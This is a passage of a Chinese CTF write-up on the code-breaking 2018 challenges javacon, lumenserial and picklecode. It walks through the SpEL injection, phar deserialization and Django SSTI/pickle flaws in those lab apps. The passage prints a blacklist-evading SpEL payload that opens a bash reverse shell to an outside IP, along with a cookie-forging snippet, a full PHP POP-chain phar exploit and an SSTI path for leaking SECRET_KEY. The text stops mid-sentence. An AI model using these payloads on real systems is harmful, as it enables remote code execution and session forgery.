class="line">        <span class="comment">//解析表达式：使用ExpressionParser来解析表达式为相应的Expression对象 </span></span><br><span class="line">        Expression expression = </span><br><span class="line">        parser.parseExpression(<span class="string">"('Hello' + ' World').concat(#end)"</span>); </span><br><span class="line">          </span><br><span class="line">        <span class="comment">//设置上下文中的变量的值 </span></span><br><span class="line">        context.setVariable(<span class="string">"end"</span>, <span class="string">"!SpringEL"</span>); </span><br><span class="line">        <span class="comment">//执行表达式，获取运行结果 </span></span><br><span class="line">        String str = (String)expression.getValue(context); </span><br><span class="line">        <span class="comment">// the str=Hello World!SpringEL</span></span><br><span class="line">        System.out.println(<span class="string">"the str="</span>+str); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>先看配置文件 <code>application.yml</code>，提供了一个黑名单和用户列表</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">  thymeleaf:</span></span><br><span class="line"><span class="attr">    encoding:</span> <span class="string">UTF-8</span></span><br><span class="line"><span class="attr">    cache:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">    mode:</span> <span class="string">HTML</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">  blacklist:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">java.+lang</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">Runtime</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">exec.*\(</span></span><br><span class="line"><span class="attr">user:</span></span><br><span class="line"><span class="attr">  username:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">  password:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">  rememberMeKey:</span> <span class="string">c0dehack1nghere1</span></span><br></pre></td></tr></table></figure></li><li><p>文件结构 : </p><ul><li><code>SmallEvaluationContext.java</code> 实现构造上下文的功能</li><li><code>ChallengeApplication.java</code> 实现启动功能</li><li><code>Encryptor.java</code> 实现 <code>AES</code> 加解密</li><li><code>KeyworkProperties.java</code> 实现黑名单</li><li><code>UserConfig.java</code> 实现用户模型，其中的 <code>RememberMe</code> 用到了 <code>Encryptor</code></li><li><code>MainController.java</code> 控制程序的主要逻辑</li></ul></li><li><p>主要看 <code>MainController.java</code> 中的代码，在 <code>login</code> 功能处，如果勾选 <code>Remember me</code> 就会返回一个加密之后的 cookie，然后跳转到 <code>hello.html</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/login"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(@RequestParam(value = <span class="string">"username"</span>, required = <span class="keyword">true</span>)</span> String username,</span></span><br><span class="line"><span class="function">                        @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"password"</span>, required = <span class="keyword">true</span>)</span> String password,</span></span><br><span class="line"><span class="function">                        @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"remember-me"</span>, required = <span class="keyword">false</span>)</span> String isRemember,</span></span><br><span class="line"><span class="function">                        HttpSession session, HttpServletResponse response)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (userConfig.getUsername().contentEquals(username) &amp;&amp; userConfig.getPassword().contentEquals(password)) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isRemember != <span class="keyword">null</span> &amp;&amp; !isRemember.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                Cookie c = <span class="keyword">new</span> Cookie(<span class="string">"remember-me"</span>, userConfig.encryptRememberMe());</span><br><span class="line">                c.setMaxAge(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span>);</span><br><span class="line">                response.addCookie(c);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login-error"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_2.PNG" alt></p></li><li><p>对敏感信息 <code>cookie</code> 的操作如下，首先判断 <code>remember-me</code> 是否存在，然后获取其值进行解密，直接将它赋值给 <code>username</code>，接下来就是使用 <code>getAdvanceValue()</code> 这个自定义函数赋值给 <code>name</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>, required = <span class="keyword">false</span>)</span> String rememberMeValue,HttpSession session,Model model) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            String username = userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">            <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="keyword">null</span> || username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        model.addAttribute(<span class="string">"name"</span>, getAdvanceValue(username.toString()));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>getAdvanceValue</code> 函数如下，就是与黑名单匹配，如果匹配则抛出 <code>FORBIDDEN</code>，否则进行正常的 SpEL 解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getAdvanceValue</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String keyword: keyworkProperties.getBlacklist()) &#123;</span><br><span class="line">            Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val);</span><br><span class="line">            <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpClientErrorException(HttpStatus.FORBIDDEN);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">        Expression exp = parser.parseExpression(val, parserContext);</span><br><span class="line">        SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line">        <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>这里就是 SpEL 注入实现 RCE 了，在不指定 <code>EvaluationContext</code> 时，默认采用的是 <code>StandardEvaluationContext</code> ，这里还进行了黑名单匹配，利用反射就可以绕过黑名单</p></li><li><p>在 JAVA 中，通过 <code>java.lang.Runtime.getRuntime().exec(cmd)</code> 来执行命令，这里可以利用反射写一个反弹 shell 来 getshell，构造 payload 如下 : </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1"&#125;)&#125;</span><br></pre></td></tr></table></figure></li><li><p>加密之后修改 cookie 发送</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.mindview.util.Print.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sss</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String x = <span class="string">"#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1\"&#125;)&#125;"</span>;</span><br><span class="line">        String y = Encryptor.encrypt(<span class="string">"c0dehack1nghere1"</span>, <span class="string">"0123456789abcdef"</span>, x);</span><br><span class="line">        print(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实现反弹 shell</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_3.PNG" alt></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/javacon_4.PNG" alt></p></li></ul><h1 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h1><ul><li><p>寻找 POP 链，phar 反序列化，GitHub 给的 docker 环境好像有点问题</p></li><li><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/lumenserial" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/lumenserial</a></p></li><li><p>首先看一下路由信息，当访问 <code>/server/editor</code> 时会调用 <code>App\Http\Controllers</code> 的 <code>main</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$router-&gt;get(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br><span class="line">$router-&gt;post(<span class="string">'/server/editor'</span>, <span class="string">'EditorController@main'</span>);</span><br></pre></td></tr></table></figure></li><li><p>进入 <code>EditorController.php</code> 文件，存在 <code>doUploadImage</code>，<code>doCatchimage</code>，<code>doListImage</code>，<code>doConfig</code> 的功能。进入 <code>main</code>，从 url 获取 action 参数，如果 action 存在就执行这个函数，返回结果均为 json 格式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $action = $request-&gt;query(<span class="string">'action'</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string($action) &amp;&amp; method_exists(<span class="keyword">$this</span>, <span class="string">"do&#123;$action&#125;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func([<span class="keyword">$this</span>, <span class="string">"do&#123;$action&#125;"</span>], $request);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FileException(<span class="string">'Method error'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileException $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> response()-&gt;json([<span class="string">'state'</span> =&gt; $e-&gt;getMessage()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在 <code>download</code> 函数中，<code>$url</code> 未经过滤就传给了 <code>file_get_contents</code>，而 <code>$url</code> 源自 <code>doCatchimage</code> 中的 <code>$request-&gt;input($this-&gt;config[&#39;catcherFieldName&#39;])</code>，查看配置文件 <code>/resources/editor/config.json</code> 就可以知道其值为 <code>source</code>，也就是 url 中的 source 参数，然后就可以利用 phar 反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">    $rets = [];</span><br><span class="line">    <span class="keyword">if</span> ($sources) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">            $rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response()-&gt;json([</span><br><span class="line">        <span class="string">'state'</span> =&gt; <span class="string">'SUCCESS'</span>,</span><br><span class="line">        <span class="string">'list'</span> =&gt; $rets</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以直接根据已有的 payload 构造反序列化 <a href="https://xz.aliyun.com/t/6059" target="_blank" rel="noopener">https://xz.aliyun.com/t/6059</a></p></li><li><p>exp : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $connection;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\Generator\MockDefinition($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = [<span class="keyword">new</span> \Mockery\Loader\EvalLoader(), <span class="string">'load'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $evilCode;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $name = <span class="string">'abcdefg'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">code</span> = "&lt;?<span class="title">php</span> <span class="title">phpinfo</span>(); <span class="keyword">exit</span>; <span class="meta">?&gt;</span><span class="string">";</span></span><br><span class="line"><span class="string">$exps = new \Illuminate\Broadcasting\PendingBroadcast($code);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $p = new Phar('exp.phar', 0, 'exp.phar');</span></span><br><span class="line"><span class="string">    $p-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;');</span></span><br><span class="line"><span class="string">    $p-&gt;setMetadata($exps);</span></span><br><span class="line"><span class="string">    $p-&gt;addFromString('1.txt','text');</span></span><br><span class="line"><span class="string">    $p-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="picklecode"><a href="#picklecode" class="headerlink" title="picklecode"></a>picklecode</h1><ul><li><p>python 反序列化，Django 模板引擎沙箱</p></li><li><p>基础知识 : <a href="https://peri0d.xyz/2019/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">python 反序列化</a></p></li><li><p>通常代码审计先看配置文件，Django 配置文件 <code>web/core/setting.py</code>，发现如下代码 : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SESSION_ENGINE = <span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line">SESSION_SERIALIZER = <span class="string">'core.serializer.PickleSerializer'</span></span><br></pre></td></tr></table></figure></li><li><p>一般默认的 Django 配置文件是不含这两项的，<code>SESSION_ENGINE</code> 是用户 session 存储的位置，<code>SESSION_SERIALIZER</code> 是 session 存储的方式。用户的 session 先经过 <code>SESSION_SERIALIZER</code> 处理成一个字符串后存储到 <code>SESSION_ENGINE</code> 指定的位置。在这里，就是 session 使用 pickle 的序列化方法，经过签名后存储在 cookies 中，我们所不知道的就是签名的密钥</p></li><li><p>思路就是获取密钥，pickle 反序列化</p></li><li><p>阅读路由信息，首先会调用 <code>views.RegistrationLoginView.as_view()</code> 函数，进行登录或者注册之后，在 <code>views.index()</code> 函数中直接将用户名拼接到模板中，也就是说这里存在着 SSTI 漏洞，那就可以利用它获取 <code>SECRET_KEY</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    django_engine = engines[<span class="string">'django'</span>]</span><br><span class="line">    template = django_engine.from_string(<span class="string">'My name is '</span> + request.user.username)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(<span class="literal">None</span>, request))</span><br></pre></td></tr></table></figure></li><li><p>随意构造一个 username 为 <code></code> 可以看到一个加密后的密码，这就验证了 SSTI</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_1.png" alt></p></li><li><p>在 <code>/template/registration/login.html</code> 的 <code>csrf_token</code> 处下个断点，可以看到有很多变量，其中有一部分是加载模板的时候传入的，还有一部分是 Django 自带的，可以在 <code>settings.py</code> 中的 <code>templates</code> 查看自带的变量</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_2.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">'BACKEND'</span>: <span class="string">'django.template.backends.django.DjangoTemplates'</span>,</span><br><span class="line">        <span class="string">'DIRS'</span>: [],</span><br><span class="line">        <span class="string">'APP_DIRS'</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">'OPTIONS'</span>: &#123;</span><br><span class="line">            <span class="string">'context_processors'</span>: [</span><br><span class="line">                <span class="string">'django.template.context_processors.debug'</span>,</span><br><span class="line">                <span class="string">'django.template.context_processors.request'</span>,</span><br><span class="line">                <span class="string">'django.contrib.auth.context_processors.auth'</span>,</span><br><span class="line">                <span class="string">'django.contrib.messages.context_processors.messages'</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>这里的 <code>context_processors</code> 就代表会向模板中注入的一些上下文。通常来说， <code>request</code> 、 <code>user</code> 、和 <code>perms</code> 都是默认存在的，但显然， <code>settings</code> 是不存在的，我们无法直接在模板中读取 settings 中的信息，包括密钥。Django 的模板引擎有一定限制，比如<strong>无法读取用下划线开头的属性</strong></p></li><li><p>经过一番寻找，在 <code>request.user.groups.source_field.opts.app_config.module.admin.settings</code> 处发现 <code>SECRET_KEY</code> ，那就可以构造 username 为 <code>request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY</code> 即可获取签名密钥了 <code>zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm</code></p></li><li><p>接着就是 pickle 的反序列化了，其核心文件为 <code>/core/serializer.py</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>其中设置了一个反序列化沙盒，禁用了 <code>&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;</code> 并且只允许调用 python 内置函数</p></li><li><p>但是 <code>getattr</code> 这个万金油函数没有被限制，那就可以使用 <code>builtins.getattr(builtins,&#39;eval&#39;)</code> 来获取 <code>eval</code> 函数，这就相当于绕过了这个沙盒</p></li><li><p>首先执行 <code>getattr</code> 获取 